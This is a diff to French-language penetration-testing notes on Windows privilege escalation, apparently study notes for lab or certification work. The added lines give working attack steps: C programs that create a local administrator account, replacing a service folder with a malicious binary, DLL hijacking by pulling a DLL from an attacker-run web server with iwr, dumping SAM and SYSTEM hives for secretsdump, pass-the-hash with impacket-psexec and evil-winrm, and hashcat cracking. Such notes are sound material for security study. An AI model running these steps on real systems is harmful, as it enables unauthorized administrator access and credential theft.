@@ -122,8 +122,8 @@ dir /s /b /a C:\*.txt
 **Lire un fichier**
 ```powershell
 # Aliases pour Get-Content
-cat C:\path\to\file.txt
 type C:\path\to\file.txt
+cat C:\path\to\file.txt
 gc C:\path\to\file.txt
 Get-Content C:\path\to\file.txt
 ```
@@ -271,6 +271,10 @@ msbuild Seatbelt.sln /p:Configuration=Release
 
 ```powershell
 Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.State -like 'Running'}
+
+Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.PathName -notmatch 'C:\\Windows'}
+
+Get-CimInstance Win32_Service -Filter "Name='EnterpriseService'" | Select-Object Name, State, StartMode, StartName, PathName
 ```
 
 **Vérifier les permissions sur un binaire de service**
@@ -281,6 +285,8 @@ Masks : `F` = Full, `M` = Modify, `RX` = Read+Execute, `R` = Read, `W` = Write.
 icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```
 
+Si pas les droits sur le binaire vérifier les droits sur le folder, si droits `M` : renommer le folder et en créer un nouveau avec son binaire malveillant.
+
 **Créer un binaire malveillant (ajoute un user admin)**
 
 ```c
@@ -288,6 +294,14 @@ icacls "C:\xampp\mysql\bin\mysqld.exe"
 int main() {
   system("net user johndoe Password123! /add");
   system("net localgroup administrators john /add");
+  return 0;
+}
+```
+
+```c
+#include <stdlib.h>
+int main() {
+  system("net user enterpriseuser Password123!");
   return 0;
 }
 ```
@@ -352,7 +366,9 @@ Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'
 
 #### Manuel
 
-**Installer Process Monitor (nécessite admin)**
+**Identifier les DLLs manquantes avec Procmon**
+
+Nécessite admin. 
 
 ```cmd
 winget install Microsoft.Sysinternals.ProcessMonitor
@@ -360,9 +376,25 @@ winget install Microsoft.Sysinternals.ProcessMonitor
 
 Ou télécharger depuis : https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
 
-**Identifier les DLLs manquantes avec Procmon**
+Lancer Procmon, filtrer sur `Process Name is <process>`. Si pas admin sur la cible, reproduire en local sur sa propre machine.
 
-Nécessite admin. Lancer Procmon, filtrer sur `Process Name is <process>`, puis `Operation is CreateFile` + `Result is NAME NOT FOUND`. Si pas admin sur la cible, reproduire en local sur sa propre machine.
+**Identifier les DLLs manquantes sur Kali**
+
+```bash
+strings service.exe | grep -i dll
+objdump -p service.exe | grep -i dll
+```
+
+**DLL Search Order**
+
+| Priority | Location                                    | Example                     |
+| -------- | ------------------------------------------- | --------------------------- |
+| 1        | Directory from which the application loaded | `C:\Program Files\App\`     |
+| 2        | System directory                            | `C:\Windows\System32\`      |
+| 3        | 16-bit system directory                     | `C:\Windows\System\`        |
+| 4        | Windows directory                           | `C:\Windows\`               |
+| 5        | Current directory                           | `C:\Users\john\`            |
+| 6        | PATH environment variable directories       | `C:\Python39\`, `C:\tools\` |
 
 **Vérifier qu'on peut écrire dans le répertoire de l'application**
 
@@ -394,14 +426,14 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 
 ```bash
 # Kali : compiler et servir
-x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
 python3 -m http.server 80
 ```
 
 **Placer la DLL et attendre l'exécution par un admin**
 
 ```powershell
-iwr -uri http://<ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+iwr -uri http://<ip>/dll.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
 ```
 
 **Vérifier que l'exploitation a fonctionné**
@@ -631,3 +663,35 @@ Prérequis : `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
 | [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation. |
 
 Choix rapide : GodPotato en premier, PrintSpoofer en fallback.
+
+### Backup Operator
+
+```
+net user <username>
+
+Local Group Memberships      *Backup Operators
+```
+
+Si un utilisateur est dans le groupe `Backup Operators`, alors il peut 
+
+```bash
+mkdir C:\temp
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+
+# Télécharger les 2 fichiers sur sa Kali
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+```
+
+**Pass-the-Hash** - s'authentifier sans connaître le mot de passe en clair :
+
+```bash
+impacket-psexec -hashes :NTLMhash administrator@IP
+evil-winrm -i IP -u administrator -H NTLMhash
+```
+
+**Crack offline** avec hashcat :
+
+```bash
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+```
